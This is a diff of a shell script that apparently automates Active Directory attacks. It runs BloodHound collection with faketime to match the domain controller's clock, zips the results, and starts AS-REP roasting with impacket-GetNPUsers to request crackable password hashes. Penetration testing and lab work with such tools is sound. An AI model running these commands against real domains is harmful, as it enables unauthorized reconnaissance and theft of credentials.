@@ -51,10 +51,10 @@ echo -en "\nTime of DC: "
 faketime "${dc_timestamp}" date
 
 #Get Bloodhound data
-echo -e "\nBLOODHOUND DATA: Running bloodhound-ce-python -ns ${dcip} -d '${dom}' -u '${user}' -p '${pass}' -c all\n"
-faketime "${dc_timestamp}" bloodhound-ce-python  -ns ${dcip} -d ${dom} -u ${user} -p ${pass} -c all
+echo -e "\nBLOODHOUND DATA: Running bloodhound-ce-python -ns ${dcip} -d '${dom}' -u '${user}' -p '${pass}' -c all -op ${dom}_bh\n"
+faketime "${dc_timestamp}" bloodhound-ce-python  -ns ${dcip} -d ${dom} -u ${user} -p ${pass} -c all -op ${dom}_bh
 echo "  ...zipping up the data as ${dom}_AD.zip"
-zip ${dom}_AD.zip 20260*.json
+zip ${dom}_AD.zip ${dom}_bh*.json
 
 #Get AS-REP roasting data
 echo -e "\nAS-REP ROASTING: Running impacket-GetNPUsers -dc-ip ${dcip} -request -outputfile hashes.asreproast ${dom}/${user}:${pass}"
